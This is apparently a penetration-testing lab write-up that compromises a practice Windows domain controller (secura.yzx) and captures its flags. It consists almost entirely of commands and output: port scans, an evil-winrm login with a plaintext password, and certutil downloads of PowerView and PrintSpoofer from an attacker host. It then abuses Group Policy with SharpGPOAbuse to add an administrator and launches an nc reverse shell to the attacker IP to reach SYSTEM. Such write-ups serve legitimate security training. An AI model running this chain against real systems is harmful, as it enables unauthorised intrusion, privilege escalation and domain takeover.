DC

## Methodology:
- Connect via `evil-winrm` using `charlotte` creds
- Enumerate to discover `SeImpersonatePrivileges`
- Upload `PrintSpoofer`
	- Run with `-c` option and use `nc` as thcommand to catch a reverse shell



#### Open Ports
```bash
nmap -v -p- -Pn --max-scan-delay=0 -oN 97/all_ports.txt 192.168.184.97
	PORT      STATE SERVICE
	53/tcp    open  domain
	88/tcp    open  kerberos-sec
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	389/tcp   open  ldap
	445/tcp   open  microsoft-ds
	464/tcp   open  kpasswd5
	593/tcp   open  http-rpc-epmap
	636/tcp   open  ldapssl
	3268/tcp  open  globalcatLDAP
	3269/tcp  open  globalcatLDAPssl
	5985/tcp  open  wsman
	9389/tcp  open  adws
	49665/tcp open  unknown
	49666/tcp open  unknown
	49668/tcp open  unknown
	49677/tcp open  unknown
	49678/tcp open  unknown
	49681/tcp open  unknown
	49708/tcp open  unknown
	49814/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49668,49677,49678,49681,49708,49814 -oN 97/open_sVsC.txt 192.168.184.97
	PORT      STATE SERVICE      VERSION
	53/tcp    open  domain       Simple DNS Plus
	88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-04 21:11:46Z)
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	9389/tcp  open  mc-nmf       .NET Message Framing
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	49678/tcp open  msrpc        Microsoft Windows RPC
	49681/tcp open  msrpc        Microsoft Windows RPC
	49708/tcp open  msrpc        Microsoft Windows RPC
	49814/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled and required
	|_clock-skew: mean: 24s, deviation: 1s, median: 23s
	| smb2-time: 
	|   date: 2024-10-04T21:12:37
	|_  start_date: 2024-09-27T21:51:05
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: dc01
	|   NetBIOS computer name: DC01\x00
	|   Domain name: secura.yzx                       # NOTE!
	|   Forest name: secura.yzx                       # NOTE!
	|   FQDN: dc01.secura.yzx                         # NOTE!
	|_  System time: 2024-10-04T21:12:38+00:00
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: required
```

## Foothold
```bash
evil-winrm -i 192.168.224.97 -u charlotte -p "Game2On4.\!"
```
## local.txt
```powershell
Get-ChildItem -Path C:\Users -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue -Force
	    Directory: C:\Users\charlotte\Desktop
	
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----       10/25/2024  11:06 PM             34 local.txt
	*Evil-WinRM* PS C:\Users\TEMP\Documents> type C:\Users\charlotte\Desktop\local.txt
	f6754be5e8504176521ffe674fdf1691

```

## Enumeration
```powershell
whoami
	secura\charlotte
whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State
	============================= ========================================= =======
	SeMachineAccountPrivilege     Add workstations to domain                Enabled
	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

## WinPEAS
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\charlotte\Documents\SharpGPOAbuse.exe": charlotte [AllAccess]
```

## Elevating to Administrator - No idea if this is necessary
- With [SharpGPOAbuse.exe](https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7)
```powershell
certutil.exe -urlcache -f http://192.168.45.224:8080/PowerView.ps1 PowerView.ps1
Import-Module .\PowerView.ps1

# Get list of all GPOs
Get-NetGPO | select displayname
	displayname
	-----------
	Default Domain Policy
	Default Domain Controllers Policy


# Get ID
Get-GPO -Name "Default Domain Policy"
	DisplayName      : Default Domain Policy
	DomainName       : secura.yzx
	Owner            : SECURA\Domain Admins
	Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
	GpoStatus        : AllSettingsEnabled
	Description      :
	CreationTime     : 8/5/2022 6:20:58 PM
	ModificationTime : 10/25/2022 5:39:34 PM
	UserVersion      : AD Version: 3, SysVol Version: 3
	ComputerVersion  : AD Version: 70, SysVol Version: 70


# Check user's perms (NOTE: 'Edit')
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
	Trustee     : charlotte
	TrusteeType : User
	Permission  : GpoEditDeleteModifySecurity
	Inherited   : False


# Add user to Admin group
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
	[+] Domain = secura.yzx
	[+] Domain Controller = dc01.secura.yzx
	[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
	[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
	[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
	[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
	[+] The GPO does not specify any group memberships.
	[+] versionNumber attribute changed successfully
	[+] The version number in GPT.ini was increased successfully.
	[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
	[+] Done!


# Force update new policy settings
gpupdate /force
	Updating policy...
	Computer Policy update has completed successfully.
	User Policy update has completed successfully.


# Verify
net localgroup administrators
	Alias name     administrators
	Comment        Administrators have complete and unrestricted access to the computer/domain
	Members
	-------------------------------------------------------------------------------
	Administrator
	charlotte
	The command completed successfully.
```

## Elevating Privs
- As we have `SeImpersonatePrivilege`
```powershell
certutil.exe -urlcache -f http://192.168.45.224:8080/PrintSpooferx64.exe PrintSpooferx64.exe

# Didn't work
.\PrintSpooferx64.exe -i -c powershell
	[+] Found privilege: SeImpersonatePrivilege
	[+] Named pipe listening...
	[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
	[!] CreateProcessWithTokenW() isn't compatible with option -i

whoami
secura\charlotte

# Had to use a revshell
PS C:\users\charlotte> .\PrintSpoofer64.exe -c "nc.exe 192.168.45.224 9997 -e cmd.exe"
	[+] Found privilege: SeImpersonatePrivilege
	[+] Named pipe listening...
	[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
	[+] CreateProcessWithTokenW() OK

# In Kali's revshell 9997
rlwrap nc -nlvp 9997
	listening on [any] 9997 ...
	connect to [192.168.45.224] from (UNKNOWN) [192.168.224.97] 51774
	Microsoft Windows [Version 10.0.14393]
	(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
	whoami
	secura\dc01$

C:\Windows\system32> type C:\users\administrator.dc01\desktop\proof.txt
	736f8124f726f6af42e79af1170faa4c
```